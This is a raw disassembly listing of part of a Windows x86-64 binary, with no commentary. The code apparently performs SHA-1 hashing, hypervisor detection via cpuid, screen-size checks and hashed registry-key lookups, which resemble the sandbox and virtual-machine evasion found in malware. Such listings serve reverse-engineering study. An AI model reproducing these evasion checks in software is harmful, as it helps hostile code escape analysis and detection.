   140044601:	and    DWORD PTR [rbp+0x7d0],0x0
   140044608:	lea    rcx,[rbp+0x7d0]
   14004460f:	mov    QWORD PTR [rsp+0x28],rcx
   140044614:	mov    DWORD PTR [rsp+0x20],r14d
   140044619:	mov    cx,0x2
   14004461d:	mov    rdx,rsi
   140044620:	mov    r8d,edi
   140044623:	mov    r9,rbx
   140044626:	call   rax
   140044628:	xor    eax,eax
   14004462a:	cmp    rax,0x40
   14004462e:	je     0x14004464b
   140044630:	mov    QWORD PTR [rbp+rax*1+0x7d0],0x1
   14004463c:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   140044645:	add    rax,0x10
   140044649:	jmp    0x14004462a
   14004464b:	lea    rax,[rbp+0x7e0]
   140044652:	movups xmm0,XMMWORD PTR [rax]
   140044655:	movups xmm1,XMMWORD PTR [rax+0x10]
   140044659:	movups xmm2,XMMWORD PTR [rax+0x20]
   14004465d:	lea    rdx,[rbp+0xf90]
   140044664:	movups XMMWORD PTR [rdx+0x20],xmm2
   140044668:	movups XMMWORD PTR [rdx+0x10],xmm1
   14004466c:	movups XMMWORD PTR [rdx],xmm0
   14004466f:	mov    QWORD PTR [rbp+0xf80],rsi
   140044676:	mov    QWORD PTR [rbp+0xf88],rdi
   14004467d:	push   0x1
   14004467f:	pop    rsi
   140044680:	mov    QWORD PTR [rbp+0xfc0],rsi
   140044687:	lea    rdi,[rbp+0xf80]
   14004468e:	mov    rcx,rdi
   140044691:	call   0x14003bf02
   140044696:	lea    rcx,[rax+0x9]
   14004469a:	mov    rbx,rcx
   14004469d:	shr    rbx,0x6
   1400446a1:	and    ecx,0x3f
   1400446a4:	cmp    rcx,rsi
   1400446a7:	sbb    rbx,0xffffffffffffffff
   1400446ab:	mov    QWORD PTR [rbp+0x1140],rbx
   1400446b2:	shl    rbx,0x6
   1400446b6:	sub    rbx,rax
   1400446b9:	lea    r14,[rbx-0x9]
   1400446bd:	shl    rax,0x3
   1400446c1:	bswap  rax
   1400446c4:	mov    QWORD PTR [rbp+0xd10],rdi
   1400446cb:	mov    QWORD PTR [rbp+0xd18],rsi
   1400446d2:	lea    rcx,[rbp+0xd18]
   1400446d9:	movups XMMWORD PTR [rcx+0x8],xmm6
   1400446dd:	movups XMMWORD PTR [rcx+0x18],xmm6
   1400446e1:	mov    QWORD PTR [rbp+0xd40],r14
   1400446e8:	mov    QWORD PTR [rbp+0xd48],rax
   1400446ef:	mov    eax,0x67452301
   1400446f4:	mov    QWORD PTR [rbp+0x1180],rax
   1400446fb:	mov    DWORD PTR [rbp+0x1170],0xefcdab89
   140044705:	mov    DWORD PTR [rbp+0x1178],0x98badcfe
   14004470f:	mov    DWORD PTR [rbp+0x1168],0x10325476
   140044719:	mov    DWORD PTR [rbp+0x1158],0xc3d2e1f0
   140044723:	mov    sil,0x1
   140044726:	xor    r15d,r15d
   140044729:	xor    r13d,r13d
   14004472c:	xor    r12d,r12d
   14004472f:	xor    edi,edi
   140044731:	cmp    rdi,QWORD PTR [rbp+0x1140]
   140044738:	je     0x1400449f4
   14004473e:	movaps XMMWORD PTR [rbp+0x2c0],xmm6
   140044745:	movaps XMMWORD PTR [rbp+0x2b0],xmm6
   14004474c:	movaps XMMWORD PTR [rbp+0x2a0],xmm6
   140044753:	movaps XMMWORD PTR [rbp+0x290],xmm6
   14004475a:	mov    rax,QWORD PTR [rbp+0xf80]
   140044761:	mov    rcx,QWORD PTR [rbp+0xf88]
   140044768:	xor    r8d,r8d
   14004476b:	cmp    r8,0x40
   14004476f:	je     0x1400447f9
   140044775:	mov    rdx,r8
   140044778:	inc    r8
   14004477b:	test   r12,r12
   14004477e:	sete   r10b
   140044782:	mov    r9,r13
   140044785:	test   r10b,0x1
   140044789:	je     0x1400447a5
   14004478b:	xor    r13d,r13d
   14004478e:	mov    r10d,0x0
   140044794:	cmp    r9,rcx
   140044797:	jae    0x140044782
   140044799:	mov    r10b,BYTE PTR [rax+r9*1]
   14004479d:	inc    r9
   1400447a0:	xor    r12d,r12d
   1400447a3:	jmp    0x1400447e9
   1400447a5:	test   r15,r15
   1400447a8:	je     0x1400447dd
   1400447aa:	lea    r11,[r15+0x1]
   1400447ae:	cmp    r15,r14
   1400447b1:	jbe    0x1400447cf
   1400447b3:	sub    r15,rbx
   1400447b6:	cmp    r15,0xfffffffffffffff8
   1400447ba:	jb     0x1400447cf
   1400447bc:	mov    r10b,BYTE PTR [rbp+r15*1+0xd50]
   1400447c4:	xor    esi,esi
   1400447c6:	push   0x1
   1400447c8:	pop    r12
   1400447ca:	mov    r15,r11
   1400447cd:	jmp    0x1400447e9
   1400447cf:	xor    esi,esi
   1400447d1:	push   0x1
   1400447d3:	pop    r12
   1400447d5:	mov    r15,r11
   1400447d8:	xor    r10d,r10d
   1400447db:	jmp    0x1400447e9
   1400447dd:	mov    r10b,0x80
   1400447e0:	xor    esi,esi
   1400447e2:	push   0x1
   1400447e4:	pop    r15
   1400447e6:	mov    r12,r15
   1400447e9:	mov    BYTE PTR [rbp+rdx*1+0x290],r10b
   1400447f1:	mov    r13,r9
   1400447f4:	jmp    0x14004476b
   1400447f9:	mov    BYTE PTR [rbp+0xd50],sil
   140044800:	mov    QWORD PTR [rbp+0xd20],r12
   140044807:	mov    QWORD PTR [rbp+0xd28],r13
   14004480e:	mov    QWORD PTR [rbp+0xd38],r15
   140044815:	movaps XMMWORD PTR [rbp+0x430],xmm6
   14004481c:	movaps XMMWORD PTR [rbp+0x420],xmm6
   140044823:	movaps XMMWORD PTR [rbp+0x410],xmm6
   14004482a:	movaps XMMWORD PTR [rbp+0x400],xmm6
   140044831:	xor    eax,eax
   140044833:	cmp    rax,0x40
   140044837:	je     0x14004484f
   140044839:	mov    ecx,DWORD PTR [rbp+rax*1+0x290]
   140044840:	bswap  ecx
   140044842:	mov    DWORD PTR [rbp+rax*1+0x400],ecx
   140044849:	add    rax,0x4
   14004484d:	jmp    0x140044833
   14004484f:	mov    rax,QWORD PTR [rbp+0x1180]
   140044856:	mov    DWORD PTR [rbp+0x7d0],eax
   14004485c:	mov    eax,DWORD PTR [rbp+0x1170]
   140044862:	mov    DWORD PTR [rbp+0x7d4],eax
   140044868:	mov    eax,DWORD PTR [rbp+0x1178]
   14004486e:	mov    DWORD PTR [rbp+0x7d8],eax
   140044874:	mov    eax,DWORD PTR [rbp+0x1168]
   14004487a:	mov    DWORD PTR [rbp+0x7dc],eax
   140044880:	mov    eax,DWORD PTR [rbp+0x1158]
   140044886:	mov    DWORD PTR [rbp+0x7e0],eax
   14004488c:	and    DWORD PTR [rbp+0x7e4],0x0
   140044893:	movaps xmm0,XMMWORD PTR [rbp+0x400]
   14004489a:	movaps xmm1,XMMWORD PTR [rbp+0x410]
   1400448a1:	movaps xmm2,XMMWORD PTR [rbp+0x420]
   1400448a8:	movaps xmm3,XMMWORD PTR [rbp+0x430]
   1400448af:	lea    rax,[rbp+0x7e8]
   1400448b6:	movups XMMWORD PTR [rax+0x30],xmm3
   1400448ba:	movups XMMWORD PTR [rax+0x20],xmm2
   1400448be:	movups XMMWORD PTR [rax+0x10],xmm1
   1400448c2:	movups XMMWORD PTR [rax],xmm0
   1400448c5:	call   0x140064214
   1400448ca:	mov    al,BYTE PTR [rip+0x541bd]        # 0x140098a8d
   1400448d0:	cmp    al,0x1
   1400448d2:	je     0x14004491b
   1400448d4:	movzx  eax,al
   1400448d7:	cmp    eax,0x2
   1400448da:	je     0x1400449e5
   1400448e0:	and    DWORD PTR [rbp+0x610],0x0
   1400448e7:	lea    rcx,[rip+0xfffffffffffbc792]        # 0x140001080
   1400448ee:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400448f5:	push   0x40
   1400448f7:	pop    r8
   1400448f9:	lea    r9,[rbp+0x610]
   140044900:	call   QWORD PTR [rip+0x4ff02]        # 0x140094808
   140044906:	test   eax,eax
   140044908:	sete   cl
   14004490b:	inc    cl
   14004490d:	mov    BYTE PTR [rip+0x5417a],cl        # 0x140098a8d
   140044913:	test   eax,eax
   140044915:	je     0x1400449e5
   14004491b:	mov    al,BYTE PTR [rip+0x54297]        # 0x140098bb8
   140044921:	cmp    al,0x1
   140044923:	je     0x14004494c
   140044925:	movzx  eax,al
   140044928:	test   eax,eax
   14004492a:	jne    0x1400449e5
   140044930:	call   0x140065d51
   140044935:	test   rax,rax
   140044938:	sete   cl
   14004493b:	inc    cl
   14004493d:	mov    BYTE PTR [rip+0x54275],cl        # 0x140098bb8
   140044943:	test   rax,rax
   140044946:	je     0x1400449e5
   14004494c:	call   0x140064227
   140044951:	mov    eax,0xc8c291de
   140044956:	xchg   DWORD PTR [rip+0x54184],eax        # 0x140098ae0
   14004495c:	call   QWORD PTR [rip+0x4fcee]        # 0x140094650
   140044962:	mov    eax,eax
   140044964:	mov    QWORD PTR [rip+0x53695],rax        # 0x140098000
   14004496b:	lea    rcx,[rbp+0x7d0]
   140044972:	push   0xffffffffffffffff
   140044974:	pop    rdx
   140044975:	call   0x14001dfc0
   14004497a:	xor    eax,eax
   14004497c:	xchg   DWORD PTR [rip+0x5415e],eax        # 0x140098ae0
   140044982:	mov    BYTE PTR [rip+0x54105],0x0        # 0x140098a8e
   140044989:	mov    rax,QWORD PTR [rbp+0x1180]
   140044990:	add    eax,DWORD PTR [rbp+0x7d0]
   140044996:	mov    QWORD PTR [rbp+0x1180],rax
   14004499d:	mov    eax,DWORD PTR [rbp+0x1170]
   1400449a3:	add    eax,DWORD PTR [rbp+0x7d4]
   1400449a9:	mov    DWORD PTR [rbp+0x1170],eax
   1400449af:	mov    eax,DWORD PTR [rbp+0x1178]
   1400449b5:	add    eax,DWORD PTR [rbp+0x7d8]
   1400449bb:	mov    DWORD PTR [rbp+0x1178],eax
   1400449c1:	mov    eax,DWORD PTR [rbp+0x1168]
   1400449c7:	add    eax,DWORD PTR [rbp+0x7dc]
   1400449cd:	mov    DWORD PTR [rbp+0x1168],eax
   1400449d3:	mov    eax,DWORD PTR [rbp+0x1158]
   1400449d9:	add    eax,DWORD PTR [rbp+0x7e0]
   1400449df:	mov    DWORD PTR [rbp+0x1158],eax
   1400449e5:	inc    rdi
   1400449e8:	mov    BYTE PTR [rip+0x5409d],0x0        # 0x140098a8c
   1400449ef:	jmp    0x140044731
   1400449f4:	mov    rcx,QWORD PTR [rbp+0x640]
   1400449fb:	mov    rdx,QWORD PTR [rbp+0x648]
   140044a02:	call   0x14006f7f7
   140044a07:	mov    rax,QWORD PTR [rbp+0x1160]
   140044a0e:	mov    r9,QWORD PTR [rax+0x18]
   140044a12:	rdtsc
   140044a14:	mov    r8,rdx
   140044a17:	shl    r8,0x20
   140044a1b:	or     r8,rax
   140044a1e:	mov    eax,0x40000000
   140044a23:	xor    ecx,ecx
   140044a25:	mov    r10,rbx
   140044a28:	cpuid
   140044a2a:	xchg   rbx,r10
   140044a2d:	mov    DWORD PTR [rbp+0x7d0],r10d
   140044a34:	mov    WORD PTR [rbp+0x7d4],cx
   140044a3b:	xor    ecx,ecx
   140044a3d:	movabs rax,0xe49e47b70d5eafc7
   140044a47:	movabs rsi,0xf78a05c12bafb8cf
   140044a51:	cmp    rcx,0x6
   140044a55:	je     0x140044a84
   140044a57:	movzx  edx,BYTE PTR [rbp+rcx*1+0x7d0]
   140044a5f:	lea    r10d,[rdx-0x41]
   140044a63:	mov    r11d,edx
   140044a66:	or     edx,0x20
   140044a69:	cmp    r10b,0x1a
   140044a6d:	cmovae edx,r11d
   140044a71:	movzx  edx,dx
   140044a74:	xor    rax,rdx
   140044a77:	imul   rax,rsi
   140044a7b:	rol    rax,0x21
   140044a7f:	inc    rcx
   140044a82:	jmp    0x140044a51
   140044a84:	movabs rcx,0xe49e47b70d5eafc7
   140044a8e:	xor    rax,rcx
   140044a91:	movabs rcx,0x406aa9c82dbf9701
   140044a9b:	imul   rax,rcx
   140044a9f:	mov    rcx,rax
   140044aa2:	shr    rcx,0x1d
   140044aa6:	xor    rcx,rax
   140044aa9:	movabs rax,0xeb591050d1f713a9
   140044ab3:	imul   rcx,rax
   140044ab7:	mov    rax,rcx
   140044aba:	shr    rax,0x20
   140044abe:	xor    rax,rcx
   140044ac1:	xor    ecx,ecx
   140044ac3:	xor    r11d,r11d
   140044ac6:	lea    r10,[rip+0x43853]        # 0x140088320
   140044acd:	cmp    rcx,0x30
   140044ad1:	je     0x140044ae3
   140044ad3:	cmp    QWORD PTR [rcx+r10*1],rax
   140044ad7:	sete   dl
   140044ada:	or     r11b,dl
   140044add:	add    rcx,0x8
   140044ae1:	jmp    0x140044acd
   140044ae3:	mov    QWORD PTR [rbp+0xca8],r11
   140044aea:	mov    eax,DWORD PTR [rbp+0x1170]
   140044af0:	mov    rcx,QWORD PTR [rbp+0x1180]
   140044af7:	shl    rcx,0x20
   140044afb:	or     rcx,rax
   140044afe:	mov    QWORD PTR [rbp+0x1180],rcx
   140044b05:	movabs rax,0x5cc804d7e1924f60
   140044b0f:	xor    r8,rax
   140044b12:	movabs rax,0x406aa9c82dbf9701
   140044b1c:	imul   r8,rax
   140044b20:	mov    rax,r8
   140044b23:	shr    rax,0x1d
   140044b27:	xor    rax,r8
   140044b2a:	movabs rcx,0xeb591050d1f713a9
   140044b34:	imul   rax,rcx
   140044b38:	mov    rcx,rax
   140044b3b:	shr    rcx,0x20
   140044b3f:	xor    rcx,rax
   140044b42:	mov    QWORD PTR [rbp+0x4e0],rcx
   140044b49:	neg    rcx
   140044b4c:	add    rcx,r9
   140044b4f:	mov    QWORD PTR [rbp+0x5d0],rcx
   140044b56:	movaps XMMWORD PTR [rbp+0x7f0],xmm6
   140044b5d:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   140044b64:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   140044b6b:	lea    rsi,[rbp+0x7d0]
   140044b72:	mov    rcx,rsi
   140044b75:	call   0x14006487c
   140044b7a:	mov    eax,DWORD PTR [rbp+0x7f0]
   140044b80:	mov    DWORD PTR [rbp+0x7c8],eax
   140044b86:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   140044b8d:	movaps XMMWORD PTR [rbp+0x800],xmm6
   140044b94:	movaps XMMWORD PTR [rbp+0x7f0],xmm6
   140044b9b:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   140044ba2:	mov    DWORD PTR [rbp+0x7d0],0x40
   140044bac:	mov    rcx,rsi
   140044baf:	call   0x140065f57
   140044bb4:	test   eax,eax
   140044bb6:	je     0x140044bf9
   140044bb8:	mov    eax,DWORD PTR [rbp+0x7dc]
   140044bbe:	xor    ecx,ecx
   140044bc0:	test   rax,rax
   140044bc3:	sete   cl
   140044bc6:	shl    ecx,0x10
   140044bc9:	mov    QWORD PTR [rbp+0xf68],rcx
   140044bd0:	jmp    0x140044c04
   140044bd2:	push   0x8
   140044bd4:	pop    rax
   140044bd5:	cmp    rax,0x98
   140044bdb:	je     0x1400443bd
   140044be1:	or     QWORD PTR [rbp+rax*1+0x7c8],0xffffffffffffffff
   140044bea:	and    QWORD PTR [rbp+rax*1+0x7d0],0x0
   140044bf3:	add    rax,0x10
   140044bf7:	jmp    0x140044bd5
   140044bf9:	mov    QWORD PTR [rbp+0xf68],0x0
   140044c04:	mov    rax,QWORD PTR [rbp+0x1180]
   140044c0b:	bswap  rax
   140044c0e:	mov    QWORD PTR [rbp+0x1180],rax
   140044c15:	xor    r12d,r12d
   140044c18:	xor    ecx,ecx
   140044c1a:	call   0x140065dcb
   140044c1f:	mov    esi,eax
   140044c21:	push   0x1
   140044c23:	pop    rcx
   140044c24:	call   0x140065dcb
   140044c29:	test   esi,esi
   140044c2b:	setg   cl
   140044c2e:	test   eax,eax
   140044c30:	setg   dl
   140044c33:	and    dl,cl
   140044c35:	cmp    esi,0x400
   140044c3b:	setb   cl
   140044c3e:	cmp    eax,0x258
   140044c43:	setb   al
   140044c46:	or     al,cl
   140044c48:	and    al,dl
   140044c4a:	movzx  eax,al
   140044c4d:	shl    eax,0x18
   140044c50:	mov    QWORD PTR [rbp+0x4e8],rax
   140044c57:	lea    rax,[rip+0x593aa]        # 0x14009e008
   140044c5e:	mov    QWORD PTR [rbp+0x7d0],rax
   140044c65:	mov    QWORD PTR [rbp+0x7d8],0x21
   140044c70:	mov    eax,0xc250001c
   140044c75:	mov    QWORD PTR [rbp+0x7e0],rax
   140044c7c:	lea    rcx,[rbp+0x290]
   140044c83:	lea    r14,[rbp+0x7d0]
   140044c8a:	mov    rdx,r14
   140044c8d:	call   0x14006392b
   140044c92:	lea    rax,[rip+0x59367]        # 0x14009e000
   140044c99:	mov    QWORD PTR [rbp+0x7d0],rax
   140044ca0:	push   0x8
   140044ca2:	pop    rbx
   140044ca3:	mov    QWORD PTR [rbp+0x7d8],rbx
   140044caa:	mov    eax,0xc260001c
   140044caf:	mov    QWORD PTR [rbp+0x7e0],rax
   140044cb6:	lea    rcx,[rbp+0x400]
   140044cbd:	mov    rdx,r14
   140044cc0:	call   0x14006392b
   140044cc5:	mov    rdx,QWORD PTR [rbp+0x298]
   140044ccc:	and    QWORD PTR [rbp+0x7d0],0x0
   140044cd4:	mov    ecx,0x80000002
   140044cd9:	mov    QWORD PTR [rbp+0xf78],rdx
   140044ce0:	mov    r8,r14
   140044ce3:	call   0x14006490c
   140044ce8:	xor    esi,esi
   140044cea:	test   eax,eax
   140044cec:	sete   sil
   140044cf0:	mov    rdi,QWORD PTR [rbp+0x7d0]
   140044cf7:	mov    rdx,QWORD PTR [rbp+0x408]
   140044cfe:	and    QWORD PTR [rbp+0x7d0],0x0
   140044d06:	mov    ecx,0x80000002
   140044d0b:	mov    QWORD PTR [rbp+0x1138],rdx
   140044d12:	mov    r8,r14
   140044d15:	call   0x14006490c
   140044d1a:	xor    ecx,ecx
   140044d1c:	test   eax,eax
   140044d1e:	sete   cl
   140044d21:	mov    rax,QWORD PTR [rbp+0x7d0]
   140044d28:	mov    QWORD PTR [rbp+0xf80],rsi
   140044d2f:	mov    QWORD PTR [rbp+0xf88],rdi
   140044d36:	mov    QWORD PTR [rbp+0xf90],rcx
   140044d3d:	mov    QWORD PTR [rbp+0xf98],rax
   140044d44:	mov    QWORD PTR [rbp+0xd10],rbx
   140044d4b:	lea    rax,[rbp+0xd18]
   140044d52:	movups XMMWORD PTR [rax],xmm6
   140044d55:	lea    rax,[rip+0x434c4]        # 0x140088220
   140044d5c:	mov    QWORD PTR [rbp+0xd28],rax
   140044d63:	mov    QWORD PTR [rbp+0xd30],0x6
   140044d6e:	lea    rax,[rip+0x4348b]        # 0x140088200
   140044d75:	mov    QWORD PTR [rbp+0xd38],rax
   140044d7c:	push   0x1
   140044d7e:	pop    rcx
   140044d7f:	mov    QWORD PTR [rbp+0xd40],rcx
   140044d86:	mov    QWORD PTR [rbp+0xd48],rcx
   140044d8d:	lea    rax,[rax+rbx*1]
   140044d91:	mov    QWORD PTR [rbp+0xd50],rax
   140044d98:	mov    QWORD PTR [rbp+0xd58],rcx
   140044d9f:	lea    rax,[rip+0x4346a]        # 0x140088210
   140044da6:	mov    QWORD PTR [rbp+0xd60],rax
   140044dad:	mov    QWORD PTR [rbp+0xd68],rcx
   140044db4:	mov    QWORD PTR [rbp+0xd70],rcx
   140044dbb:	lea    rax,[rip+0x43456]        # 0x140088218
   140044dc2:	mov    QWORD PTR [rbp+0xd78],rax
   140044dc9:	mov    QWORD PTR [rbp+0xd80],rcx
   140044dd0:	mov    QWORD PTR [rbp+0x1140],0x0
   140044ddb:	imul   rax,r12,0x28
   140044ddf:	lea    rcx,[rbp+0xce8]
   140044de6:	add    rax,rcx
   140044de9:	cmp    r12,0x3
   140044ded:	je     0x140045017
   140044df3:	mov    rcx,QWORD PTR [rax+0x38]
   140044df7:	cmp    rcx,0x1
   140044dfb:	ja     0x140048122
   140044e01:	shl    rcx,0x4
   140044e05:	add    rax,0x28
   140044e09:	inc    r12
   140044e0c:	cmp    BYTE PTR [rbp+rcx*1+0xf80],0x0
   140044e14:	je     0x140044de9
   140044e16:	add    rcx,rbp
   140044e19:	add    rcx,0xf80
   140044e20:	mov    rdx,QWORD PTR [rax]
   140044e23:	mov    QWORD PTR [rbp+0x1170],rdx
   140044e2a:	mov    r14,QWORD PTR [rax+0x8]
   140044e2e:	mov    rdx,QWORD PTR [rax+0x18]
   140044e32:	mov    QWORD PTR [rbp+0x1178],rdx
   140044e39:	mov    rax,QWORD PTR [rax+0x20]
   140044e3d:	mov    QWORD PTR [rbp+0x1168],rax
   140044e44:	mov    rdx,QWORD PTR [rcx+0x8]
   140044e48:	xor    r15d,r15d
   140044e4b:	xor    eax,eax
   140044e4d:	push   0x40
   140044e4f:	pop    rcx
   140044e50:	lea    rdi,[rbp+0x7d0]
   140044e57:	rep stos DWORD PTR [rdi],eax
   140044e59:	mov    QWORD PTR [rbp+0x1158],rdx
   140044e60:	mov    rdi,rdx
   140044e63:	xor    esi,esi
   140044e65:	lea    rbx,[rbp+0x610]
   140044e6c:	movabs r13,0xf78a05c12bafb8cf
   140044e76:	mov    DWORD PTR [rbp+0x610],0x100
   140044e80:	mov    rcx,rdi
   140044e83:	mov    edx,r15d
   140044e86:	lea    r8,[rbp+0x7d0]
   140044e8d:	mov    r9,rbx
   140044e90:	call   0x1400648b1
   140044e95:	cmp    eax,0xea
   140044e9a:	je     0x140044f8b
   140044ea0:	test   eax,eax
   140044ea2:	jne    0x140044fe2
   140044ea8:	mov    eax,DWORD PTR [rbp+0x610]
   140044eae:	cmp    eax,0x101
   140044eb3:	lea    rdx,[rbp+0x7d0]
   140044eba:	push   0x1
   140044ebc:	pop    rcx
   140044ebd:	cmovae rdx,rcx
   140044ec1:	mov    ecx,0x0
   140044ec6:	cmovae eax,ecx
   140044ec9:	xor    r8d,r8d
   140044ecc:	movabs rcx,0xe49e47b70d5eafc7
   140044ed6:	cmp    rax,r8
   140044ed9:	je     0x140044f07
   140044edb:	movzx  r9d,BYTE PTR [rdx+r8*1]
   140044ee0:	lea    r10d,[r9-0x41]
   140044ee4:	mov    r11d,r9d
   140044ee7:	or     r9d,0x20
   140044eeb:	cmp    r10b,0x1a
   140044eef:	cmovae r9d,r11d
   140044ef3:	movzx  r9d,r9w
   140044ef7:	xor    rcx,r9
   140044efa:	imul   rcx,r13
   140044efe:	rol    rcx,0x21
   140044f02:	inc    r8
   140044f05:	jmp    0x140044ed6
   140044f07:	movabs rax,0xe49e47b70d5eafc7
   140044f11:	xor    rcx,rax
   140044f14:	movabs rax,0x406aa9c82dbf9701
   140044f1e:	imul   rcx,rax
   140044f22:	mov    rdx,rcx
   140044f25:	shr    rdx,0x1d
   140044f29:	xor    rdx,rcx
   140044f2c:	movabs rax,0xeb591050d1f713a9
   140044f36:	imul   rdx,rax
   140044f3a:	mov    rax,rdx
   140044f3d:	shr    rax,0x20
   140044f41:	xor    rax,rdx
   140044f44:	cmp    rsi,r14
   140044f47:	mov    rcx,QWORD PTR [rbp+0x1170]
   140044f4e:	lea    rcx,[rcx+rsi*8]
   140044f52:	mov    rdx,QWORD PTR [rbp+0x1168]
   140044f59:	push   0x1
   140044f5b:	pop    r8
   140044f5d:	cmovb  rdx,r8
   140044f61:	cmovae rcx,QWORD PTR [rbp+0x1178]
   140044f69:	xor    r9d,r9d
   140044f6c:	xor    r8d,r8d
   140044f6f:	cmp    rdx,r9
   140044f72:	je     0x140044f85
   140044f74:	cmp    QWORD PTR [rcx+r9*8],rax
   140044f78:	lea    r9,[r9+0x1]
   140044f7c:	sete   r10b
   140044f80:	or     r8b,r10b
   140044f83:	jmp    0x140044f6f
   140044f85:	test   r8b,0x1
   140044f89:	jne    0x140044f93
   140044f8b:	inc    r15d
   140044f8e:	jmp    0x140044e76
   140044f93:	cmp    rsi,r14
   140044f96:	je     0x140044fe6
   140044f98:	and    QWORD PTR [rbp+0x640],0x0
   140044fa0:	mov    rcx,rdi
   140044fa3:	lea    rdx,[rbp+0x7d0]
   140044faa:	lea    r8,[rbp+0x640]
   140044fb1:	call   0x14006490c
   140044fb6:	mov    ebx,eax
   140044fb8:	mov    r13,QWORD PTR [rbp+0x640]
   140044fbf:	cmp    rdi,QWORD PTR [rbp+0x1158]
   140044fc6:	je     0x140044fd0
   140044fc8:	mov    rcx,rdi
   140044fcb:	call   0x140064781
   140044fd0:	test   ebx,ebx
   140044fd2:	jne    0x140044ffc
   140044fd4:	inc    rsi
   140044fd7:	xor    r15d,r15d
   140044fda:	mov    rdi,r13
   140044fdd:	jmp    0x140044e65
   140044fe2:	xor    esi,esi
   140044fe4:	jmp    0x140044fe9
   140044fe6:	mov    sil,0x1
   140044fe9:	cmp    rdi,QWORD PTR [rbp+0x1158]
   140044ff0:	je     0x140044ffe
   140044ff2:	mov    rcx,rdi
   140044ff5:	call   0x140064781
   140044ffa:	jmp    0x140044ffe
   140044ffc:	xor    esi,esi
   140044ffe:	or     sil,BYTE PTR [rbp+0x1140]
   140045005:	and    sil,0x1
   140045009:	mov    eax,esi
   14004500b:	mov    QWORD PTR [rbp+0x1140],rax
   140045012:	jmp    0x140044ddb
   140045017:	xor    esi,esi
   140045019:	cmp    rsi,0x20
   14004501d:	je     0x14004503c
   14004501f:	cmp    DWORD PTR [rbp+rsi*1+0xf80],0x1
   140045027:	jne    0x140045036
   140045029:	mov    rcx,QWORD PTR [rbp+rsi*1+0xf88]
   140045031:	call   0x140064781
   140045036:	add    rsi,0x10
   14004503a:	jmp    0x140045019
   14004503c:	mov    rcx,QWORD PTR [rbp+0x400]
   140045043:	mov    rdx,QWORD PTR [rbp+0x1138]
   14004504a:	call   0x14006f7f7
   14004504f:	mov    rcx,QWORD PTR [rbp+0x290]
   140045056:	mov    rdx,QWORD PTR [rbp+0xf78]
   14004505d:	call   0x14006f7f7
   140045062:	lea    rcx,[rbp+0xf80]
   140045069:	call   0x140064dbd
   14004506e:	xor    eax,eax
   140045070:	cmp    rax,QWORD PTR [rbp+0xf80]
   140045077:	mov    eax,0x0
   14004507c:	mov    QWORD PTR [rbp+0x1178],rax
   140045083:	push   0x1
   140045085:	pop    rax
   140045086:	mov    QWORD PTR [rbp+0x1170],rax
   14004508d:	mov    esi,0x0
   140045092:	jo     0x14004513b
   140045098:	mov    rax,QWORD PTR [rbp+0xf90]
   14004509f:	mov    QWORD PTR [rbp+0x620],rax
   1400450a6:	movups xmm0,XMMWORD PTR [rbp+0xf80]
   1400450ad:	movaps XMMWORD PTR [rbp+0x610],xmm0
   1400450b4:	lea    rax,[rip+0x58f6e]        # 0x14009e029
   1400450bb:	mov    QWORD PTR [rbp+0x7d0],rax
   1400450c2:	mov    QWORD PTR [rbp+0x7d8],0x8
   1400450cd:	mov    eax,0xc4400021
   1400450d2:	mov    QWORD PTR [rbp+0x7e0],rax
   1400450d9:	lea    rcx,[rbp+0xd10]
   1400450e0:	lea    rdx,[rbp+0x7d0]
   1400450e7:	call   0x140063a6d
   1400450ec:	mov    rdi,QWORD PTR [rbp+0xd18]
   1400450f3:	mov    r8,QWORD PTR [rbp+0xd20]
   1400450fa:	lea    rcx,[rbp+0x610]
   140045101:	mov    rdx,rdi
   140045104:	call   0x140063f0e
   140045109:	mov    rax,QWORD PTR [rbp+0x610]
   140045110:	mov    QWORD PTR [rbp+0x1178],rax
   140045117:	mov    rax,QWORD PTR [rbp+0x618]
   14004511e:	mov    QWORD PTR [rbp+0x1170],rax
   140045125:	mov    rsi,QWORD PTR [rbp+0x620]
   14004512c:	mov    rcx,QWORD PTR [rbp+0xd10]
   140045133:	mov    rdx,rdi
   140045136:	call   0x14006f7f7
   14004513b:	lea    rax,[rip+0x4313e]        # 0x140088280
   140045142:	mov    QWORD PTR [rbp+0x290],rax
   140045149:	push   0xc
   14004514b:	pop    rcx
   14004514c:	mov    QWORD PTR [rbp+0x298],rcx
   140045153:	lea    rax,[rip+0x43132]        # 0x14008828c
   14004515a:	mov    QWORD PTR [rbp+0x2a0],rax
   140045161:	mov    QWORD PTR [rbp+0x2a8],rcx
   140045168:	lea    rdi,[rbp+0xd10]
   14004516f:	mov    rcx,rdi
   140045172:	lea    rdx,[rbp+0x290]
   140045179:	call   0x14003bc2c
   14004517e:	lea    rbx,[rbp+0x7d0]
   140045185:	mov    rcx,rbx
   140045188:	mov    rdx,rdi
   14004518b:	call   0x14003bac6
   140045190:	lea    rcx,[rbp+0x640]
   140045197:	mov    rdx,rbx
   14004519a:	call   0x14003c0c9
   14004519f:	mov    rax,QWORD PTR [rbp+0x1170]
   1400451a6:	add    rsi,rax
   1400451a9:	mov    QWORD PTR [rbp+0x7d0],rax
   1400451b0:	mov    QWORD PTR [rbp+0x7d8],rsi
   1400451b7:	and    WORD PTR [rbp+0x7e0],0x0
   1400451bf:	lea    rcx,[rbp+0x400]
   1400451c6:	mov    rdx,rbx
   1400451c9:	call   0x14003bf24
   1400451ce:	mov    rcx,QWORD PTR [rbp+0x648]
   1400451d5:	mov    rax,QWORD PTR [rbp+0x650]
   1400451dc:	add    rax,rcx
   1400451df:	mov    QWORD PTR [rbp+0x1138],rcx
   1400451e6:	mov    QWORD PTR [rbp+0x7d0],rcx
   1400451ed:	mov    QWORD PTR [rbp+0x7d8],rax
   1400451f4:	and    WORD PTR [rbp+0x7e0],0x0
   1400451fc:	lea    rcx,[rbp+0x418]
   140045203:	mov    rdx,rbx
   140045206:	call   0x14003bf24
   14004520b:	mov    QWORD PTR [rbp+0xf80],0x8
   140045216:	lea    rax,[rbp+0xf88]
   14004521d:	movups XMMWORD PTR [rax],xmm6
   140045220:	lea    rax,[rip+0x430a1]        # 0x1400882c8
   140045227:	mov    QWORD PTR [rbp+0xf98],rax
   14004522e:	mov    QWORD PTR [rbp+0xfa0],0x5
   140045239:	lea    rax,[rip+0x43058]        # 0x140088298
   140045240:	mov    QWORD PTR [rbp+0xfa8],rax
